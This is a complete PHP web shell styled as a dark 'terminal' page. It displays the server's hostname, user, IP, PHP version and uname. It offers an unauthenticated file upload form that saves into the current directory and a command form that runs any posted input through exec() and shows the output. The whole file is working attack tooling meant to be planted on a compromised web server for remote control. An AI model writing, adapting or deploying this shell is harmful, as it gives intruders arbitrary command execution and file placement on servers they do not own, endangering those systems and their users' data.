<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            font-size: 14px;
            background-color: #1E1E1E;
            color: #FFFFFF;
            margin: 4px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 1px;
        }

        caption {
            font-weight: bold;
            text-align: center;
            background-color: #333333;
            color: #FFFFFF;
            padding: 2px;
            border: 0.5px solid #666666;
        }

        th, td {
            border: 0.5px solid #666666;
            padding: 2px;
        }

        tr:nth-child(even) {
            background-color: #2C2C2C;
        }

        tr:nth-child(odd) {
            background-color: #1E1E1E;
        }

        form {
            background-color: #333333;
            border: 0.5px solid #666666;
            padding: 2px;
            margin-bottom: 1px;
            border-radius: 3px;
        }

        label {
            display: block;
            margin-bottom: 1px;
            color: #CCCCCC;
        }

        input[type="file"],
        input[type="text"] {
            display: block;
            width: calc(100% - 12px); /* Adjust for padding */
            margin-bottom: 10px;
            background-color: #444444;
            color: #ffb200;
            border: 0.5px solid #666666;
            padding: 2px;
            border-radius: 3px;
        }

        input[type="submit"] {
            background-color: #666666;
            color: #FFFFFF;
            border: 0.5px solid #666666;
            padding: 2px;
            cursor: pointer;
            border-radius: 3px;
        }

        #terminal {
            background-color: #2C2C2C;
            border: 0.5px solid #666666;
            padding: 4px;
            overflow: auto;
            flex: 1; /* Allow it to expand */
            border-radius: 3px;
            min-height: 50px; /* Ensure it has a minimum height */
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
        }

        pre {
            margin: 0;
            color: #FFFFFF;
            white-space: pre-wrap; /* Wrap long lines */
        }

        /* Highlighting styles */
        .command {
            color: #8be9fd; /* Light blue for commands */
        }

        .output {
            color: #f8f8f2; /* Default output color */
        }

        .error {
            color: #ff5555; /* Red for errors */
        }

        .path {
            color: #50fa7b; /* Green for paths */
        }

        .keyword {
            color: #ff79c6; /* Pink for keywords */
        }

        .variable {
            color: #f1fa8c; /* Yellow for variables */
        }

        .string {
            color: #ffd700; /* Gold for strings */
        }

        .comment {
            color: #6272a4; /* Light blue for comments */
        }

        .number {
            color: #bd93f9; /* Light purple for numbers */
        }

        .function {
            color: #ffb86c; /* Orange for functions */
        }

        .operator {
            color: #ff79c6; /* Pink for operators */
        }
    </style>
</head>
<body>

    <!-- ASCII Art -->
    <div style="text-align: center; font-family: monospace; white-space: pre;">
        ____             _                  ____  __ ___
       / __ )____ ______(_)____            / _/ |/ //  /
      / __  / __ `/ ___/ / ___/  ______   / / |   / / / 
     / /_/ / /_/ (__  ) / /__   /_____/  / / /   | / /  
    /_____/\__,_/____/_/\___/           / / /_/|_|/ /   
    </div>

    <!-- Server Information Table -->
    <table>
        <caption>SERVER INFORMATION</caption>
        <tbody>
            <tr>
                <td>HOSTNAME:</td>
                <td><?php echo gethostname(); ?></td>
            </tr>
            <tr>
                <td>USERNAME:</td>
                <td><?php echo get_current_user(); ?></td>
            </tr>
            <tr>
                <td>IP:</td>
                <td><?php echo $_SERVER['SERVER_ADDR']; ?></td>
            </tr>
            <tr>
                <td>PHP VERSION:</td>
                <td><?php echo phpversion(); ?></td>
            </tr>
            <tr>
                <td>UNAME:</td>
                <td><?php echo php_uname(); ?></td>
            </tr>
            <tr>
                <td>CURRENT DIRECTORY:</td>
                <td><?php echo getcwd(); ?></td>
            </tr>
        </tbody>
    </table>

    <!-- File Upload Form -->
    <form method="post" enctype="multipart/form-data">
        <label for="file">Upload File</label>
        <input type="file" id="file" name="file">
        <input type="submit" value="Upload File">
    </form>

    <!-- Command Execution Form -->
    <form method="post">
        <label for="cmd">Command:</label>
        <input type="text" id="cmd" name="cmd" placeholder="Enter command">
        <input type="submit" value="Execute">
    </form>

    <!-- Terminal Output -->
    <div id="terminal">
        <div id="result">
        <?php
        // Function to execute commands
        function executeCommand($cmd) {
            $user = get_current_user(); // Get current user
            $host = gethostname();      // Get real hostname
            $dir = getcwd();           // Get current working directory
            exec($cmd . " 2>&1", $output, $retval);

            $result = "<pre>";
            $result .= "<span class='command'>{$user}@{$host}:{$dir}$ </span><span class='command'>{$cmd}</span>\n";
            
            foreach ($output as $line) {
                // Escape HTML entities
                $line = htmlspecialchars($line, ENT_QUOTES, 'UTF-8');
                
                // Color specific patterns
                $line = preg_replace('/(\b(?:cd|ls|mkdir|rm|echo|cat|grep|chmod|chown|tail|find|wget|curl|ps|top|df|du)\b)/i', '<span class="keyword">$1</span>', $line); // Commands
                $line = preg_replace('/(\b\w+=[\'"][^\']*[\'"]\b)/i', '<span class="variable">$1</span>', $line); // Variables
                $line = preg_replace('/(["\'])(.*?)\1/', '<span class="string">$0</span>', $line); // Strings
                $line = preg_replace('/(\/[^\s]+\/[^\s]*)/', '<span class="path">$1</span>', $line); // Paths
                $line = preg_replace('/(\#.*)/', '<span class="comment">$1</span>', $line); // Comments
                $line = preg_replace('/(\d+)/', '<span class="number">$1</span>', $line); // Numbers
                $line = preg_replace('/(\+|\-|\*|\/|\&|\||\!|\=|\<|\>|\%)/', '<span class="operator">$1</span>', $line); // Operators
                $line = preg_replace('/(\bfunction\b)/i', '<span class="function">$1</span>', $line); // Functions

                // Highlight errors
                if (strpos(strtolower($line), 'error') !== false) {
                    $line = "<span class='error'>$line</span>";
                } else {
                    $line = "<span class='output'>$line</span>";
                }

                $result .= "$line\n";
            }

            $result .= "</pre>";
            return $result;
        }

        // Function to handle file upload
        function handleFileUpload() {
            if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
                $uploadDir = getcwd() . '/'; // Directory where uploaded files will be stored in current directory
                $uploadFile = $uploadDir . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
                    echo "<pre>File uploaded successfully: " . htmlspecialchars($uploadFile) . "</pre>";
                } else {
                    echo "<pre>Error uploading file.</pre>";
                }
            } else {
                echo "<pre>Error: " . htmlspecialchars($_FILES['file']['error']) . "</pre>";
            }
        }

        // Handle file upload if form submitted
        if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_FILES['file'])) {
            handleFileUpload();
        }

        // Handle command execution if form submitted
        if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            $result = executeCommand($cmd);
            echo $result;
        }
        ?>
        </div>
    </div>

</body>
</html>
